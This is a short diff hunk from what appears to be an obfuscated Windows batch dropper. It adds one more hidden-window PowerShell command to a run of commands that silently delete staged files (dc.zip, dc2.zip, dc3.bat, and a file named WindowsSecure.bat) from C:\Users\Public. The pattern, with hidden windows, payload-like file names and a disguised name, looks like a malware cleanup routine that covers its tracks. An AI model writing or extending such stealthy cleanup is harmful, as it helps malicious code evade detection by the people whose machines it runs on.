@@ -63,6 +63,7 @@ set ZQ=e
 cls
 C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Remove-item C:\\Users\\Public\\dc.zip;
 C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Remove-item C:\\Users\\Public\\dc2.zip;
+C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Remove-item C:\\Users\\Public\\dc3.bat;
 C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Remove-item C:\\Users\\Public\\Document\\dc.bat;
 C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Remove-item C:\\Users\\Public\\Document\\dc2.bat;
 C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Remove-item C:\\Users\\Public\\Document\\WindowsSecure.bat;
